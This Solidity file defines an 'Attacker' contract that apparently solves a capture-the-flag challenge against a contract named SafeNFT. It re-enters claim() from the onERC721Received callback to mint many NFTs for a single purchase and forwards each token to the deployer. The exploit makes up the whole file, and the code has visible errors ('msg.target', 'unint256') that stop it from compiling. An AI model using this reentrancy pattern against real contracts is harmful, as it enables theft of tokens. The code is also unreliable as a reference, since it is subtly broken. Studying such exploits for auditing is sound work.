contract Attacker is IERC721Receiver {
    uint private counter;
    uint private count;
    address private owner;
    SafeNFT private target;

    constructor(uint countInput, address targetInput){
        target = SafeNFT(targetInput);
        count = countInput;
        owner = msg.target;
    }

    function startAttack() external payable {
        target.buyNFT{value: msg.value}();
        //  canClaim[attacker] = true;
        target.claim();
        // onERC721Received
    }

    function claimAgain() internal {
        counter++;
        if(counter != count) {
            target.claim();
            // onERC721Received
        }
    }

    function onERC721Received(
        address a,
        address b,
        unint256 tokenId,
        bytes calldata
    ) external override returns (bytes4){
        target.transferFrom(address(this), owner, tokenId);
        claimAgain();
        return IERC721Receiver.onERC721Received.selector;
    }


}